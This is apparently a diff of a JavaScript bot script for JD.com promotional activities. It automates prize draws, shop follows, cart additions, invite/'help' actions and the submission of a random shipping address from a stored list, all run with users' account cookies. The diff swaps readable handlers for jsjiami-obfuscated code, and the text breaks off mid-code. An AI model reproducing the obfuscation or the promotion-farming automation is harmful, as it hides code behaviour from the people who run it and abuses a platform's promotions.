+var __encode ='jsjiami.com',_a={}, _0xb483=["\x5F\x64\x65\x63\x6F\x64\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"];(function(_0xd642x1){_0xd642x1[_0xb483[0]]= _0xb483[1]})(_a);var __Oxe963e=["\x6C\x65\x6E\x67\x74\x68","\x72\x65\x63\x6F\x72\x64","\x59\x59\x59\x59\x2D\x4D\x4D\x2D\x44\x44","\x66\x6F\x72\x6D\x61\x74","\x6E\x6F\x77","\x6E\x65\x65\x64\x57\x72\x69\x74\x65\x41\x64\x64\x72\x65\x73\x73","\x6E","\x79","\x67\x69\x66\x74\x44\x61\x74\x65","\x64\x72\x61\x77\x54\x69\x6D\x65","\x73\x68\x69\x77\x75\x4E\x61\x6D\x65","\x6E\x61\x6D\x65","\u4EAC\u8C46","\x69\x6E\x64\x65\x78\x4F\x66","\u79EF\u5206","\u5238","\x72\x65\x61\x6C\x46\x6C\x61\x67","\x20\uD83C\uDF89\uD83C\uDF89\uD83C\uDF89\u5B9E\u7269\u5956\u52B1\x3A","\x6C\x6F\x67","\x67\x65\x6E\x65\x72\x61\x74\x65\x49\x64","\x61\x64\x64\x72\x65\x73\x73\x49\x64","","\x72\x61\x6E\x64\x6F\x6D","\x61\x64\x64\x72\x65\x73\x73\x41\x72\x72\x61\x79","\x72\x6F\x75\x6E\x64","\x66\x75\x6C\x6C\x41\x64\x64\x72\x65\x73\x73","\x2C","\x73\x70\x6C\x69\x74","\x70\x72\x6F\x76\x69\x6E\x63\x65","\x63\x69\x74\x79","\x63\x6F\x75\x6E\x74\x79","\x61\x64\x64\x72\x65\x73\x73","\x70\x68\x6F\x6E\x65","\x70\x6F\x73\x74\x61\x6C\x43\x6F\x64\x65","\x61\x72\x65\x61\x43\x6F\x64\x65","\x70\x6F\x73\x74\x61\x6C\x4E\x61\x6D\x65","\x73\x61\x76\x65\x41\x64\x64\x72\x65\x73\x73\x57\x69\x74\x68\x47\x65\x6E\x65\x72\x61\x74\x65\x49\x64","\x75\x6E\x64\x65\x66\x69\x6E\x65\x64","\u5220\u9664","\u7248\u672C\u53F7\uFF0C\x6A\x73\u4F1A\u5B9A","\u671F\u5F39\u7A97\uFF0C","\u8FD8\u8BF7\u652F\u6301\u6211\u4EEC\u7684\u5DE5\u4F5C","\x6A\x73\x6A\x69\x61","\x6D\x69\x2E\x63\x6F\x6D"];if($[__Oxe963e[0x1]][__Oxe963e[0x0]]> 0){today= moment(Date[__Oxe963e[0x4]]())[__Oxe963e[0x3]](__Oxe963e[0x2]);for(let record of $[__Oxe963e[0x1]]){needWriteAddress= record[__Oxe963e[0x5]]|| __Oxe963e[0x6];if(needWriteAddress== __Oxe963e[0x7]){$[__Oxe963e[0x8]]= record[__Oxe963e[0x9]];if(today== $[__Oxe963e[0x8]]){$[__Oxe963e[0xa]]= record[__Oxe963e[0xb]];if($[__Oxe963e[0xa]][__Oxe963e[0xd]](__Oxe963e[0xc])==  -1&& $[__Oxe963e[0xa]][__Oxe963e[0xd]](__Oxe963e[0xe])==  -1&& $[__Oxe963e[0xa]][__Oxe963e[0xd]](__Oxe963e[0xf])==  -1){if($[__Oxe963e[0x10]]){console[__Oxe963e[0x12]](__Oxe963e[0x11]+ $[__Oxe963e[0xa]])};$[__Oxe963e[0x13]]= record[__Oxe963e[0x14]]|| __Oxe963e[0x15];randomidx= Math[__Oxe963e[0x18]](Math[__Oxe963e[0x16]]()* $[__Oxe963e[0x17]][__Oxe963e[0x0]]);if(randomidx> ($[__Oxe963e[0x17]][__Oxe963e[0x0]]- 1)){randomidx= $[__Oxe963e[0x17]][__Oxe963e[0x0]]- 1};randomIdxShow= randomidx+ 1;$[__Oxe963e[0x19]]= $[__Oxe963e[0x17]][randomidx];let fullAddressArray=$[__Oxe963e[0x19]][__Oxe963e[0x1b]](__Oxe963e[0x1a]);$[__Oxe963e[0x1c]]= fullAddressArray[0x0];$[__Oxe963e[0x1d]]= fullAddressArray[0x1];$[__Oxe963e[0x1e]]= fullAddressArray[0x2];$[__Oxe963e[0x1f]]= fullAddressArray[0x3];$[__Oxe963e[0x20]]= fullAddressArray[0x4];$[__Oxe963e[0x21]]= fullAddressArray[0x5];$[__Oxe963e[0x22]]= fullAddressArray[0x6];$[__Oxe963e[0x23]]= fullAddressArray[0x7]; await takePostRequest(`${__Oxe963e[0x24]}`)}}}}};(function(_0xf3a4x3,_0xf3a4x4,_0xf3a4x5,_0xf3a4x6,_0xf3a4x7,_0xf3a4x8){_0xf3a4x8= __Oxe963e[0x25];_0xf3a4x6= function(_0xf3a4x9){if( typeof alert!== _0xf3a4x8){alert(_0xf3a4x9)};if( typeof console!== _0xf3a4x8){console[__Oxe963e[0x12]](_0xf3a4x9)}};_0xf3a4x5= function(_0xf3a4xa,_0xf3a4x3){return _0xf3a4xa+ _0xf3a4x3};_0xf3a4x7= _0xf3a4x5(__Oxe963e[0x26],_0xf3a4x5(_0xf3a4x5(__Oxe963e[0x27],__Oxe963e[0x28]),__Oxe963e[0x29]));try{_0xf3a4x3= __encode;if(!( typeof _0xf3a4x3!== _0xf3a4x8&& _0xf3a4x3=== _0xf3a4x5(__Oxe963e[0x2a],__Oxe963e[0x2b]))){_0xf3a4x6(_0xf3a4x7)}}catch(e){_0xf3a4x6(_0xf3a4x7)}})({})
 }
 
 //运行
@@ -370,11 +369,13 @@ async function takePostRequest(type) {
             url = `https://${$.domain}/common/accessLog`;
             let pageurl = `${$.activityUrl}`
             body = `venderId=${$.venderId}&code=${$.activityType}&pin=${$.enPin}&activityId=${$.activityId}&pageUrl=${encodeURIComponent(pageurl)}&subType=app&adSource=`
+            // console.log(body)
             break;
         case 'accessLogWithAD':
             url = `https://${$.domain}/common/accessLogWithAD`;
-            let pageurl1 = `${$.activityUrl}`
+            let pageurl1 = $.activityUrl
             body = `venderId=${$.venderId}&code=${$.activityType}&pin=${$.enPin}&activityId=${$.activityId}&pageUrl=${encodeURIComponent(pageurl1)}&subType=app&adSource=`
+            // console.log(body)
             break;
         case 'getUserInfo':
             url = `https://${$.domain}/wxActionCommon/getUserInfo`;
@@ -444,16 +445,15 @@ async function takePostRequest(type) {
         $.post(myRequest, (err, resp, data) => {
             try {
                 setActivityCookie(resp)
-                // console.log(type + `--->${activityCookie}`)
                 if (err) {
                     if (resp && typeof resp.statusCode != 'undefined') {
                         if (resp.statusCode == 493) {
-                            console.log('此ip已被限制，请过10分钟后再执行脚本\n')
-                            $.outFlag = true
+                            console.log('😭 此ip已被限制，请过10分钟后再执行脚本')
+                            $.stop = true
                         }
                     }
-                    console.log(`${$.toStr(err, err)}`)
-                    console.log(`${type} API请求失败，请检查网路重试`)
+                    // console.log(`${$.toStr(err, err)}`)
+                    //                     console.log(`😭 ${type} API请求失败，请检查网路重试`)
                 } else {
                     // console.log(`${type}----->${data}`);
                     dealReturn(type, data);
@@ -469,387 +469,7 @@ async function takePostRequest(type) {
 }
 
 
-async function dealReturn(type, data) {
-    let res = ''
-    try {
-        if (type != 'accessLogWithAD' || type != 'drawContent') {
-            if (data) {
-                res = JSON.parse(data);
-            }
-        }
-    } catch (e) {
-        console.log(`${type} 执行任务异常`);
-        console.log(data);
-        $.runFalag = false;
-    }
-    try {
-        switch (type) {
-            case 'isvObfuscator':
-                if (typeof res == 'object') {
-                    if (res.errcode == 0) {
-                        if (typeof res.token != 'undefined') $.Token = res.token
-                    } else if (res.message) {
-                        console.log(`isvObfuscator ${res.message || ''}`)
-                    } else {
-                        console.log(data)
-                    }
-                } else {
-                    console.log(data)
-                }
-                break;
-            case 'getSimpleActInfoVo':
-                if (typeof res == 'object') {
-                    if (res.result && res.result === true) {
-                        if (typeof res.data.shopId != 'undefined') $.shopId = res.data.shopId
-                        if (typeof res.data.venderId != 'undefined') $.venderId = res.data.venderId
-                        if (typeof res.data.activityType != 'undefined') $.activityType = res.data.activityType
-                    } else if (res.errorMessage) {
-                        console.log(`${type} ${res.errorMessage || ''}`)
-                    } else {
-                        console.log(`${type} ${data}`)
-                    }
-                } else {
-                    console.log(`${type} ${data}`)
-                }
-                break;
-            case 'getOpenStatus':
-                if (typeof res == 'object') {
-                    if (res.result && res.result === true) {
-                        $.needOpenCard = res.data
-                    } else if (res.errorMessage) {
-                        console.log(`${type} ${res.errorMessage || ''}`)
-                    } else {
-                        console.log(`${type} ${data}`)
-                    }
-                } else {
-                    console.log(`${type} ${data}`)
-                }
-                break;
-            case 'getOpenCardInfo':
-                if (typeof res == 'object') {
-                    if (res.result && res.result === true) {
-                        $.openedCardStatus = res.data.openedCard || false
-                    } else if (res.errorMessage) {
-                        console.log(`${type} ${res.errorMessage || ''}`)
-                    } else {
-                        console.log(`${type} ${data}`)
-                    }
-                } else {
-                    console.log(`${type} ${data}`)
-                }
-                break;
-            case 'getMyPing':
-                if (typeof res == 'object') {
-                    if (res.result && res.result === true) {
-                        console.log("MyPin" + res.data.secretPin)
-                        if (res.data && typeof res.data.secretPin != 'undefined') $.Pin = res.data.secretPin
-                        if (res.data && typeof res.data.nickname != 'undefined') $.nickname = res.data.nickname
-                    } else if (res.errorMessage) {
-                        console.log(`${type} ${res.errorMessage || ''}`)
-                    } else {
-                        console.log(`${type} ${data}`)
-                    }
-                } else {
-                    console.log(`${type} ${data}`)
-                }
-                break;
-            case 'getUserInfo':
-                if (typeof res == 'object') {
-                    if (res.result && res.result === true) {
-                        if (res.data && typeof res.data.yunMidImageUrl != 'undefined') $.attrTouXiang = res.data.yunMidImageUrl || "https://img10.360buyimg.com/imgzone/jfs/t1/7020/27/13511/6142/5c5138d8E4df2e764/5a1216a3a5043c5d.png"
-                    } else if (res.errorMessage) {
-                        console.log(`${type} ${res.errorMessage || ''}`)
-                    } else {
-                        console.log(`${type} ${data}`)
-                    }
-                } else {
-                    console.log(`${type} ${data}`)
-                }
-                break;
-            case 'activityContent':
-                if (typeof res == 'object') {
-                    if (res.result && res.result === true) {
-                        $.hasFollow = res.data.hasFollow || ''
-                        $.needFollow = res.data.needFollow || false
-                        $.canDrawTimes = res.data.canDrawTimes || 0
-                        $.content = res.data.content
-                        if ($.index == 1) {
-                            $.prizeMsg = '奖励列表\n'
-                            for (let prizeInfo of $.content) {
-                                if (prizeInfo.name.indexOf("谢谢") != -1) {
-                                    $.prizeMsg += `${prizeInfo.name}\n`
-                                }
-
-                            }
-                            console.log($.prizeMsg)
-                        }
-                        $.drawConsume = res.data.drawConsume || 0
-                        $.startTime = res.data.startTime || 0
-                        $.endTime = res.data.endTime || 0
-                    } else if (res.errorMessage) {
-                        console.log(`${type} ${res.errorMessage || ''}`)
-                    } else {
-                        console.log(`${type} ${data}`)
-                    }
-                } else {
-                    console.log(`${type} ${data}`)
-                }
-                break;
-            case 'cjactivityContent':
-                if (typeof res == 'object') {
-                    if (res.result && res.result === true) {
-                        console.log(JSON.stringify(res.data))
-                        $.hasJoinMan = res.data.hasJoinMan || 0
-                        $.member = res.data.member || false
-                        $.canDrawTimes = res.data.canDrawTimes || 0
-                        $.content = res.data.content || []
-                        if ($.index == 1 && $.prizeMsg == '') {
-                            for (let prizeInfo of $.content) {
-                                $.prizeMsg += `${prizeInfo.name}\n`
-                            }
-                        }
-                        $.drawConsume = res.data.drawConsume || 0
-                        $.startTime = res.data.startTime || 0
-                        $.endTime = res.data.endTime || 0
-                    } else if (res.errorMessage) {
-                        console.log(`${type} ${res.errorMessage || ''}`)
-                    } else {
-                        console.log(`${type} ${data}`)
-                    }
-                } else {
-                    console.log(`${type} ${data}`)
-                }
-                break;
-            case 'shopInfo':
-                if (typeof res == 'object') {
-                    if (res.result && res.result === true) {
-                        $.shopName = res.data.shopName;
-                    }
-                }
-                break;
-            case 'cjstart':
-            case 'start':
-                if (typeof res == 'object') {
-                    if (res.result && res.result === true) {
-                        console.log(JSON.stringify(res))
-                        if (res.data.drawOk) {
-                            console.log(`获得${res.data.name}`)
-                            console.log(`还能抽` + res.data.canDrawTimes + `次`)
-                            $.canDrawTimes = res.data.canDrawTimes
-                            $.message += res.data.name;
-                        }
-                    } else if (res.errorMessage) {
-                        console.log(`${res.errorMessage}`)
-                        $.message += `${res.errorMessage}`
-                        $.break = true
-                    }
-                } else {
-                    console.log(`抽了个寂寞~`)
-                }
-                break;
-            case 'getActMemberInfo':
-                if (typeof res == 'object') {
-                    if (res.result && res.result === true) {
-                        $.actMemberStatus = res.data.actMemberStatus
-                        $.openCardStatus = res.data.openCard
-                    } else if (res.errorMessage) {
-                        console.log(`${type} ${res.errorMessage || ''}`)
-                    } else {
-                        console.log(`${type} ${data}`)
-                    }
-                } else {
-                    console.log(`${type} ${data}`)
-                }
-                break;
-            case 'hasPrize':
-                if (typeof res == 'object') {
-                    if (res.ok && res.ok === true) {
-                        $.uuid = res.data.uuid
-                        if ($.index == 1) {
-                            $.friendUuid = $.uuid
-                            console.log(`接下来都会助力${$.friendUuid}}`)
-                        }
-                    } else if (res.errorMessage) {
-                        console.log(`${type} ${res.errorMessage || ''}`)
-                    } else {
-                        console.log(`${type} ${data}`)
-                    }
-                } else {
-                    console.log(`${type} ${data}`)
-                }
-                break;
-            case 'getCountByPin':
-                if (typeof res == 'object') {
-                    if (res.ok && res.ok === true) {
-                        if (typeof res.data == 'object') {
-                            $.hbSum = res.data.hbSum;
-                            $.inviteeCount = res.data.inviteeCount;
-                            // $.hbSum = res.data.hbSum;
-                            // $.hbSum = res.data.hbSum;
-                            console.log(`--------------`)
-                            console.log(`邀请人数：${$.inviteeCount}`)
-                        }
-                    }
-                }
-                break;
-            case 'followShop':
-                if (typeof res == 'object') {
-                    if (res.result && res.result === true) {
-                        console.log(`关注成功！`)
-                    }
-                }
-                break;
-            case 'getDrawRecord':
-                if (typeof res == 'object') {
-                    $.record = []
-                    if (res.result && res.result === true) {
-                        $.record = res.data
-                    }
-                }
-                break;
-            case 'addShareOpen':
-                if (typeof res == 'object') {
-                    if (res.ok && res.ok === true) {
-                        console.log(`助力成功！`)
-                    }
-                }
-                break;
-            case 'visitSku':
-            case 'toShop':
-            case 'addCart':
-                if (typeof res == 'object') {
-                    console.log(JSON.stringify(res))
-                    if (res.result && res.result === true) {
-                        $.hasAddCartSize = res.data.hasAddCartSize
-                        if (res.data.hasAddCartSize >= $.needCollectionSize) {
-
-                            $.log(`加购完成，本次加购${res.data.hasAddCartSize}个商品`)
-                            break;
-                        }
-                    } else {
-                        $.log(JSON.stringify(res))
-                        break
-                    }
-
-                }
-                break;
-            case 'oneKeyAddCart':
-                if (typeof res == 'object') {
-                    if (res.result && res.result === true) {
-                        if (res.data.hasAddCartSize >= $.needCollectionSize) {
-                            console.log(`加购完成，本次加购${res.data.hasAddCartSize}个商品`)
-                        }
-                    } else {
-                        console.log(JSON.stringify(res))
-                        return
-                    }
-                }
-                break;
-            case 'getPrize':
-                if (typeof res == 'object') {
-                    if (res.result && res.data.drawOk) {
-                        console.log(`获得 ${res.data.name}`);
-                        $.message += `京东账号${$.UserName} 获得 ${res.data.name}\n`
-                    } else {
-                        console.log(`${res.errorMessage}`);
-                        $.message += `京东账号${$.UserName}  ${res.errorMessage}\n`
-                    }
-                }
-                break;
-            case 'getDrawRecordHasCoupon':
-                if (typeof res == 'object') {
-                    if (res.result && res.result === true) {
-                        console.log(`我的奖品：`)
-                        let num = 0
-                        let value = 0
-                        let dayShareTime = 0
-                        for (let i in res.data.recordList) {
-                            let item = res.data.recordList[i]
-                            if (item.infoName == '20京豆' && item.drawStatus == 0) {
-                                num++
-                                value = item.infoName.replace('京豆', '')
-                                dayShareTime = dayShareTime < item.createTime ? item.createTime : dayShareTime;
-                            } else {
-                                console.log(`${item.infoType != 10 && item.value && item.value + ':' || ''}${item.infoName}`)
-                            }
-                        }
-                        if (dayShareTime > 0) console.log("最新邀请奖励时间:" + $.time("yyyy-MM-dd HH:mm:ss", dayShareTime))
-                        if (num > 0) console.log(`邀请好友(${num}):${num * parseInt(value, 10) || 30}京豆`)
-                    } else if (res.errorMessage) {
-                        console.log(`${type} ${res.errorMessage || ''}`)
-                    } else {
-                        console.log(`${type} ${data}`)
-                    }
-                } else {
-                    console.log(`${type} ${data}`)
-                }
-                break;
-            case 'getShareRecord':
-                if (typeof res == 'object') {
-                    if (res.result && res.result === true && res.data) {
-                        $.ShareCount = res.data.shareList.length
-                        $.log(`=========== 你邀请了:${$.ShareCount}个\n由于接口数据只有30个 故邀请大于30个的需要自行判断\n`)
-                    } else if (res.errorMessage) {
-                        console.log(`${type} ${res.errorMessage || ''}`)
-                    } else {
-                        console.log(`${type} ${data}`)
-                    }
-                } else {
-                    console.log(`${type} ${data}`)
-                }
-                break;
-            case 'saveAddress':
-            case 'saveAddressWithGenerateId':
-                console.log(JSON.stringify(res))
-                if (typeof res == 'object') {
-                    if (res.result && res.result === true) {
-                        console.log(`地址填写成功！`)
-                        $.message += `获得实物奖励，地址为${$.fullAddress}\n`
-                    } else {
-                        console.log(`${type} ${data}`)
-                    }
-                }
-                break;
-            case '邀请':
-            case '助力':
-                // console.log(data)
-                if (typeof res == 'object') {
-                    if (res.data.status == 200) {
-                        if (type == '助力') {
-                            console.log('助力成功')
-                        } else {
-                            $.yaoqing = true
-                        }
-                    } else if (res.data.status == 105) {
-                        console.log('已经助力过')
-                    } else if (res.data.status == 104) {
-                        console.log('已经助力其他人')
-                    } else if (res.data.status == 101) {
-                        // console.log('已经助力过')
-                    } else {
-                        console.log(data)
-                    }
-                } else {
-                    console.log(`${type} ${data}`)
-                }
-
-            case 'accessLogWithAD':
-            case 'drawContent':
-                break;
-            default:
-                console.log(`${type}-> ${data}`);
-        }
-        if (typeof res == 'object') {
-            if (res.errorMessage) {
-                if (res.errorMessage.indexOf('火爆') > -1) {
-                    $.hotFlag = true
-                }
-            }
-        }
-    } catch (e) {
-        console.log(e)
-    }
-}
+var __encode ='jsjiami.com',_a={}, _0xb483=["\x5F\x64\x65\x63\x6F\x64\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"];(function(_0xd642x1){_0xd642x1[_0xb483[0]]= _0xb483[1]})(_a);var __Oxe963f=["","\x61\x63\x63\x65\x73\x73\x4C\x6F\x67\x57\x69\x74\x68\x41\x44","\x64\x72\x61\x77\x43\x6F\x6E\x74\x65\x6E\x74","\x70\x61\x72\x73\x65","\x20\u6267\u884C\u4EFB\u52A1\u5F02\u5E38","\x6C\x6F\x67","\x72\x75\x6E\x46\x61\x6C\x61\x67","\x6F\x62\x6A\x65\x63\x74","\x65\x72\x72\x63\x6F\x64\x65","\x74\x6F\x6B\x65\x6E","\x75\x6E\x64\x65\x66\x69\x6E\x65\x64","\x54\x6F\x6B\x65\x6E","\x6D\x65\x73\x73\x61\x67\x65","\x69\x73\x76\x4F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x20","\x69\x73\x76\x4F\x62\x66\x75\x73\x63\x61\x74\x6F\x72","\x72\x65\x73\x75\x6C\x74","\x73\x68\x6F\x70\x49\x64","\x64\x61\x74\x61","\x76\x65\x6E\x64\x65\x72\x49\x64","\x61\x63\x74\x69\x76\x69\x74\x79\x54\x79\x70\x65","\x65\x72\x72\x6F\x72\x4D\x65\x73\x73\x61\x67\x65","\x20","\x67\x65\x74\x53\x69\x6D\x70\x6C\x65\x41\x63\x74\x49\x6E\x66\x6F\x56\x6F","\x6E\x65\x65\x64\x4F\x70\x65\x6E\x43\x61\x72\x64","\x67\x65\x74\x4F\x70\x65\x6E\x53\x74\x61\x74\x75\x73","\x6F\x70\x65\x6E\x65\x64\x43\x61\x72\x64\x53\x74\x61\x74\x75\x73","\x6F\x70\x65\x6E\x65\x64\x43\x61\x72\x64","\x67\x65\x74\x4F\x70\x65\x6E\x43\x61\x72\x64\x49\x6E\x66\x6F","\x73\x65\x63\x72\x65\x74\x50\x69\x6E","\x50\x69\x6E","\x6E\x69\x63\x6B\x6E\x61\x6D\x65","\x67\x65\x74\x4D\x79\x50\x69\x6E\x67","\x79\x75\x6E\x4D\x69\x64\x49\x6D\x61\x67\x65\x55\x72\x6C","\x61\x74\x74\x72\x54\x6F\x75\x58\x69\x61\x6E\x67","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x69\x6D\x67\x31\x30\x2E\x33\x36\x30\x62\x75\x79\x69\x6D\x67\x2E\x63\x6F\x6D\x2F\x69\x6D\x67\x7A\x6F\x6E\x65\x2F\x6A\x66\x73\x2F\x74\x31\x2F\x37\x30\x32\x30\x2F\x32\x37\x2F\x31\x33\x35\x31\x31\x2F\x36\x31\x34\x32\x2F\x35\x63\x35\x31\x33\x38\x64\x38\x45\x34\x64\x66\x32\x65\x37\x36\x34\x2F\x35\x61\x31\x32\x31\x36\x61\x33\x61\x35\x30\x34\x33\x63\x35\x64\x2E\x70\x6E\x67","\x67\x65\x74\x55\x73\x65\x72\x49\x6E\x66\x6F","\x68\x61\x73\x46\x6F\x6C\x6C\x6F\x77","\x6E\x65\x65\x64\x46\x6F\x6C\x6C\x6F\x77","\x63\x61\x6E\x44\x72\x61\x77\x54\x69\x6D\x65\x73","\x63\x6F\x6E\x74\x65\x6E\x74","\x69\x6E\x64\x65\x78","\x70\x72\x69\x7A\x65\x4D\x73\x67","\u5956\u52B1\u5217\u8868\x0A","\uD83C\uDF89\uD83C\uDF89\uD83C\uDF89\x20\u5956\u52B1\u5217\u8868\x20\uD83C\uDF89\uD83C\uDF89\uD83C\uDF89\x5C\x6E","\u8C22\u8C22","\x69\x6E\x64\x65\x78\x4F\x66","\x6E\x61\x6D\x65","\x5C\x6E","\u267B\uFE0F\u267B\uFE0F\u267B\uFE0F\x20","\x64\x72\x61\x77\x43\x6F\x6E\x73\x75\x6D\x65","\x73\x74\x61\x72\x74\x54\x69\x6D\x65","\x65\x6E\x64\x54\x69\x6D\x65","\x61\x63\x74\x69\x76\x69\x74\x79\x43\x6F\x6E\x74\x65\x6E\x74","\x68\x61\x73\x4A\x6F\x69\x6E\x4D\x61\x6E","\x6D\x65\x6D\x62\x65\x72","\x63\x6A\x61\x63\x74\x69\x76\x69\x74\x79\x43\x6F\x6E\x74\x65\x6E\x74","\x73\x68\x6F\x70\x4E\x61\x6D\x65","\x5C\x6E\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D","\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D","\x73\x68\x6F\x70\x49\x6E\x66\x6F","\x63\x6A\x73\x74\x61\x72\x74","\x64\x72\x61\x77\x4F\x6B","\x72\x65\x61\x6C\x46\x6C\x61\x67","\x20\uD83C\uDF89\uD83C\uDF89\uD83C\uDF89\u83B7\u5F97","\u4EAC\u8C46","\u79EF\u5206","\u5238","\u7A7A\u6C14","\x20\u7A7A\u6C14","\u8FD8\u80FD\u62BD","\u6B21","\u274C","\u62BD\u4E86\u4E2A\u5BC2\u5BDE\x7E","\x73\x74\x61\x72\x74","\x61\x63\x74\x4D\x65\x6D\x62\x65\x72\x53\x74\x61\x74\x75\x73","\x6F\x70\x65\x6E\x43\x61\x72\x64\x53\x74\x61\x74\x75\x73","\x6F\x70\x65\x6E\x43\x61\x72\x64","\x67\x65\x74\x41\x63\x74\x4D\x65\x6D\x62\x65\x72\x49\x6E\x66\x6F","\u2705\u5173\u6CE8\u6210\u529F\uFF01","\x66\x6F\x6C\x6C\x6F\x77\x53\x68\x6F\x70","\x72\x65\x63\x6F\x72\x64","\x67\x65\x74\x44\x72\x61\x77\x52\x65\x63\x6F\x72\x64","\u83B7\u5F97\x20","\u4EAC\u4E1C\u8D26\u53F7","\x55\x73\x65\x72\x4E\x61\x6D\x65","\x20\u83B7\u5F97\x20","\x20\x20","\x67\x65\x74\x50\x72\x69\x7A\x65","\x73\x61\x76\x65\x41\x64\x64\x72\x65\x73\x73","\x20\uD83C\uDF89\uD83C\uDF89\uD83C\uDF89\u5730\u5740\u586B\u5199\u6210\u529F\uFF0C\u5730\u5740\u4E3A","\x66\x75\x6C\x6C\x41\x64\x64\x72\x65\x73\x73","\u83B7\u5F97\u5B9E\u7269\u5956\u52B1\uFF0C\u5730\u5740\u4E3A","\x73\x61\x76\x65\x41\x64\x64\x72\x65\x73\x73\x57\x69\x74\x68\x47\x65\x6E\x65\x72\x61\x74\x65\x49\x64","\u706B\u7206","\x68\x6F\x74\x46\x6C\x61\x67","\u5220\u9664","\u7248\u672C\u53F7\uFF0C\x6A\x73\u4F1A\u5B9A","\u671F\u5F39\u7A97\uFF0C","\u8FD8\u8BF7\u652F\u6301\u6211\u4EEC\u7684\u5DE5\u4F5C","\x6A\x73\x6A\x69\x61","\x6D\x69\x2E\x63\x6F\x6D"];async function dealReturn(_0xef5fx2,_0xef5fx3){let _0xef5fx4=__Oxe963f[0x0];try{if(_0xef5fx2!= __Oxe963f[0x1]|| _0xef5fx2!= __Oxe963f[0x2]){if(_0xef5fx3){_0xef5fx4= JSON[__Oxe963f[0x3]](_0xef5fx3)}}}catch(e){console[__Oxe963f[0x5]](`${__Oxe963f[0x0]}${_0xef5fx2}${__Oxe963f[0x4]}`);console[__Oxe963f[0x5]](_0xef5fx3);$[__Oxe963f[0x6]]= false};try{switch(_0xef5fx2){case __Oxe963f[0xe]:if( typeof _0xef5fx4== __Oxe963f[0x7]){if(_0xef5fx4[__Oxe963f[0x8]]== 0){if( typeof _0xef5fx4[__Oxe963f[0x9]]!= __Oxe963f[0xa]){$[__Oxe963f[0xb]]= _0xef5fx4[__Oxe963f[0x9]]}}else {if(_0xef5fx4[__Oxe963f[0xc]]){console[__Oxe963f[0x5]](`${__Oxe963f[0xd]}${_0xef5fx4[__Oxe963f[0xc]]|| __Oxe963f[0x0]}${__Oxe963f[0x0]}`)}else {console[__Oxe963f[0x5]](_0xef5fx3)}}}else {console[__Oxe963f[0x5]](_0xef5fx3)};break;case __Oxe963f[0x16]:if( typeof _0xef5fx4== __Oxe963f[0x7]){if(_0xef5fx4[__Oxe963f[0xf]]&& _0xef5fx4[__Oxe963f[0xf]]=== true){if( typeof _0xef5fx4[__Oxe963f[0x11]][__Oxe963f[0x10]]!= __Oxe963f[0xa]){$[__Oxe963f[0x10]]= _0xef5fx4[__Oxe963f[0x11]][__Oxe963f[0x10]]};if( typeof _0xef5fx4[__Oxe963f[0x11]][__Oxe963f[0x12]]!= __Oxe963f[0xa]){$[__Oxe963f[0x12]]= _0xef5fx4[__Oxe963f[0x11]][__Oxe963f[0x12]]};if( typeof _0xef5fx4[__Oxe963f[0x11]][__Oxe963f[0x13]]!= __Oxe963f[0xa]){$[__Oxe963f[0x13]]= _0xef5fx4[__Oxe963f[0x11]][__Oxe963f[0x13]]}}else {if(_0xef5fx4[__Oxe963f[0x14]]){console[__Oxe963f[0x5]](`${__Oxe963f[0x0]}${_0xef5fx2}${__Oxe963f[0x15]}${_0xef5fx4[__Oxe963f[0x14]]|| __Oxe963f[0x0]}${__Oxe963f[0x0]}`)}else {console[__Oxe963f[0x5]](`${__Oxe963f[0x0]}${_0xef5fx2}${__Oxe963f[0x15]}${_0xef5fx3}${__Oxe963f[0x0]}`)}}}else {console[__Oxe963f[0x5]](`${__Oxe963f[0x0]}${_0xef5fx2}${__Oxe963f[0x15]}${_0xef5fx3}${__Oxe963f[0x0]}`)};break;case __Oxe963f[0x18]:if( typeof _0xef5fx4== __Oxe963f[0x7]){if(_0xef5fx4[__Oxe963f[0xf]]&& _0xef5fx4[__Oxe963f[0xf]]=== true){$[__Oxe963f[0x17]]= _0xef5fx4[__Oxe963f[0x11]]}else {if(_0xef5fx4[__Oxe963f[0x14]]){console[__Oxe963f[0x5]](`${__Oxe963f[0x0]}${_0xef5fx2}${__Oxe963f[0x15]}${_0xef5fx4[__Oxe963f[0x14]]|| __Oxe963f[0x0]}${__Oxe963f[0x0]}`)}else {console[__Oxe963f[0x5]](`${__Oxe963f[0x0]}${_0xef5fx2}${__Oxe963f[0x15]}${_0xef5fx3}${__Oxe963f[0x0]}`)}}}else {console[__Oxe963f[0x5]](`${__Oxe963f[0x0]}${_0xef5fx2}${__Oxe963f[0x15]}${_0xef5fx3}${__Oxe963f[0x0]}`)};break;case __Oxe963f[0x1b]:if( typeof _0xef5fx4== __Oxe963f[0x7]){if(_0xef5fx4[__Oxe963f[0xf]]&& _0xef5fx4[__Oxe963f[0xf]]=== true){$[__Oxe963f[0x19]]= _0xef5fx4[__Oxe963f[0x11]][__Oxe963f[0x1a]]|| false}else {if(_0xef5fx4[__Oxe963f[0x14]]){console[__Oxe963f[0x5]](`${__Oxe963f[0x0]}${_0xef5fx2}${__Oxe963f[0x15]}${_0xef5fx4[__Oxe963f[0x14]]|| __Oxe963f[0x0]}${__Oxe963f[0x0]}`)}else {console[__Oxe963f[0x5]](`${__Oxe963f[0x0]}${_0xef5fx2}${__Oxe963f[0x15]}${_0xef5fx3}${__Oxe963f[0x0]}`)}}}else {console[__Oxe963f[0x5]](`${__Oxe963f[0x0]}${_0xef5fx2}${__Oxe963f[0x15]}${_0xef5fx3}${__Oxe963f[0x0]}`)};break;case __Oxe963f[0x1f]:if( typeof _0xef5fx4== __Oxe963f[0x7]){if(_0xef5fx4[__Oxe963f[0xf]]&& _0xef5fx4[__Oxe963f[0xf]]=== true){if(_0xef5fx4[__Oxe963f[0x11]]&&  typeof 